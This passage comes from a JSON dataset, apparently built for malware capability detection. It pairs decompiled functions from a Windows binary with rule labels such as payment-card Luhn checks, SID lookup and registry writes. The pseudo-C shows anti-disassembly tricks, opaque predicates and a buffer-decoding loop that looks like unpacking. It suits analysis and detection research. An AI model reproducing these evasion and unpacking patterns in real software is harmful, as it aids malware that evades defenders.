        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_67h\n\nvoid __cdecl fcn.00404ce0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint unaff_EDI;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    _var_68h = _var_68h & 0xffffff00;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00404b40(&var_68h, &var_4h, unaff_EDI, unaff_EBX, _var_68h, stack0xffffff98);\n    fcn.004046b0(&var_68h, var_4h, 0x411740, 0x12000);\n    *arg_8h = 0x411740;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 300
    },
    "00404d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e7b) overlaps instruction at (ram,0x00404e78)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00404e25)\n// WARNING: Removing unreachable block (ram,0x00404e42)\n// WARNING: Removing unreachable block (ram,0x00404e44)\n// WARNING: Removing unreachable block (ram,0x00404e66)\n// WARNING: Removing unreachable block (ram,0x00404e6f)\n// WARNING: Removing unreachable block (ram,0x00404e7d)\n// WARNING: Removing unreachable block (ram,0x00404e7b)\n// WARNING: Removing unreachable block (ram,0x00404e90)\n// WARNING: Removing unreachable block (ram,0x00404ef5)\n// WARNING: Removing unreachable block (ram,0x00404f1e)\n// WARNING: Removing unreachable block (ram,0x00404f5c)\n// WARNING: Removing unreachable block (ram,0x00404f47)\n// WARNING: Removing unreachable block (ram,0x00404f57)\n// WARNING: Removing unreachable block (ram,0x00404f61)\n// WARNING: Removing unreachable block (ram,0x00404d79)\n\nuint __cdecl fcn.00404d60(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    char extraout_CL;\n    uchar *puVar2;\n    uchar *puVar3;\n    uint *unaff_EDI;\n    bool bVar4;\n    bool bVar5;\n    \n    puVar2 = &stack0xfffffffc;\n    puVar3 = &stack0xfffffffc;\n    if (arg_ch == 1) {\n        func_0x004026d0();\n        fcn.00404540();\n        bVar4 = false;\n        bVar5 = (extraout_CL - 5U & 0x44) == 0;\n        fcn.00401890();\n        if ((bVar4 || bVar5) || (!bVar4 && !bVar5)) {\n            puVar3 = &stack0xfffffffc;\n            if (*0x423778 != 0) goto code_r0x00404e01;\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        }\n        else {\n            arg_ch = 5;\n            *unaff_EDI = *0x1;\n            puVar2 = 0xa1e181d0;\n            *0xbeef790 = *0xbeef790 + -0xc;\n        }\n        fcn.00403370();\n        puVar3 = puVar2;\n    }\ncode_r0x00404e01:\n    uVar1 = (*_sym.imp.USER32.dll_DefWindowProcA)(*(puVar3 + 8), arg_ch, *(puVar3 + 0x10), *(puVar3 + 0x14));\n    return uVar1;\n}\n",
        "token_count": 668
    },
    "00401a70": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a95) overlaps instruction at (ram,0x00401a94)\n// \n// WARNING: Removing unreachable block (ram,0x00401a95)\n\nvoid fcn.00401a70(uint param_1)\n\n{\n    uint in_EAX;\n    uint *unaff_EDI;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        *unaff_EDI = in_EAX;\n    }\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(param_1, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 173
    },
    "004048c0": {
        "rules": [
            "get user security identifier"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404975) overlaps instruction at (ram,0x00404973)\n// \n// WARNING: Removing unreachable block (ram,0x004048e7)\n\nuint __cdecl fcn.004048c0(uint Sid)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint *var_31ch;\n    uint uStack772;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x104;\n    if ((!SBORROW4(&stack0xfffffffc, 0x31c)) && (SBORROW4(&stack0xfffffffc, 0x31c))) {\n        *var_31ch = uStack772;\n        return uStack772;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &var_ch);\n    bVar2 = iVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    if ((!bVar2) && (bVar2)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, Sid);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 471
    },
    "004046b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404715) overlaps instruction at (ram,0x00404712)\n// \n// WARNING: Removing unreachable block (ram,0x00404709)\n\nvoid __cdecl fcn.004046b0(int32_t arg_8h, uint32_t arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    char cVar4;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar5;\n    char *in_EDX;\n    uint8_t uVar6;\n    int32_t *unaff_EBX;\n    bool bVar7;\n    uint8_t in_AF;\n    \n    uVar5 = 0;\n    bVar7 = false;\n    uVar3 = arg_14h;\n    if (arg_14h != 0) {\n        do {\n            if ((uVar3 < 0) || (uVar3 >= 0)) {\n                unaff_EBX = unaff_EBX & 0xffffff00 | *(uVar5 + arg_10h);\n            }\n            uVar3 = in_EAX + 0x311c8a2f + bVar7;\n            bVar7 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n            if ((bVar7) || (!bVar7)) {\n                uVar6 = 0;\n                in_EDX = NULL;\n                uVar3 = uVar5;\n            }\n            else {\n                puVar2 = arg_10h + 1;\n                out(*arg_10h, in_EDX);\n                uVar6 = in_AF;\n                do {\n                    cVar4 = uVar3 >> 8;\n                    uVar6 = 9 < (uVar3 & 0xf) | uVar6;\n                    uVar3 = CONCAT31(CONCAT21(uVar3 >> 0x10, cVar4 - uVar6), -uVar6);\n                    arg_10h = puVar2;\n                    in_AF = uVar6;\n                } while (uVar6 || cVar4 == *in_EDX);\n            }\n            piVar1 = arg_14h + in_EDX * 2;\n            *piVar1 = (*piVar1 + 0x7b) - uVar6;\n            *(uVar5 - 0x75) = uVar3;\n            *unaff_EBX = *unaff_EBX << 0x12;\n            in_EDX = CONCAT44(in_EDX, uVar3) % arg_ch;\n            uVar6 = unaff_EBX ^ in_EDX[arg_8h];\n            unaff_EBX = unaff_EBX & 0xffffff00 | uVar6;\n            *(uVar5 + arg_10h) = uVar6;\n            uVar5 = uVar5 + 1;\n            bVar7 = uVar5 < arg_14h;\n            in_EAX = arg_8h;\n            uVar3 = uVar5 - arg_14h;\n        } while (bVar7);\n    }\n    return;\n}\n",
        "token_count": 698
    },
    "00403340": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00403340(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071dc, 0x407220, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    }
}